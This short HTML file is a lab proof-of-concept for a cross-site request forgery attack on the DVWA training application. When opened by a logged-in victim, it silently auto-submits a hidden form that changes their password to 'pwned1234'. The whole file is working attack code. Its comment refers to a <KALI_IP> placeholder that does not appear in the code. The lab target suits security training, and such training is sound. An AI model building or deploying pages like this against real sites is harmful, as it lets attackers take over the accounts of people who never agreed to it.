<!-- csrf_attack.html
  Lab-only proof-of-concept page that, when opened in a browser where the victim is
  authenticated to DVWA, will submit a password change form automatically.
  Replace <KALI_IP> with your DVWA host (e.g. 192.168.56.102).
-->
<html>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="http://192.168.56.102/DVWA/vulnerabilities/csrf/">
      <input type="hidden" name="password_new" value="pwned1234">
      <input type="hidden" name="password_conf" value="pwned1234">
      <input type="hidden" name="Change" value="Change">
    </form>
    <p>If the victim is logged in to DVWA this will attempt to change their password.</p>
  </body>
</html>
